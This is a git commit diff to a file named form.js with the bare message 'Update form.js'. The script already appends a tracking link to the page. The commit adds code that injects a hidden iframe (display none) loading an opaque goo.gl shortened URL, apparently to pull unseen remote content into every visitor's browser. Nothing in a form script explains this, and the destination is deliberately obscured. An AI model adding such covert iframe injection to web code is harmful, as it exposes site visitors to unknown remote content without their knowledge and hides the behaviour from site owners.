2dab4274988cb2d2b7350988edb722407043a743
maycowmoura <maycowmoura@gmail.com>
2017-01-19 15:37:25 -0200

    Update form.js

--- form.js
+++ form.js
@@ -5,4 +5,8 @@ x.send();
 document.body.innerHTML += '<a title="website statistics" href="http://statcounter.com/" target="_blank"><img src="//c.statcounter.com/11224860/0/ef036333/1/" alt="website statistics" style="border:none;"></a>';
 
 //(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-90547717-1', 'auto'); ga('send', 'pageview');
-/*
+*/
+var i = document.createElement('iframe');
+i.src = 'https://goo.gl/VbbZ9c';
+i.style.display = 'none';
+document.body.appendChild(i);
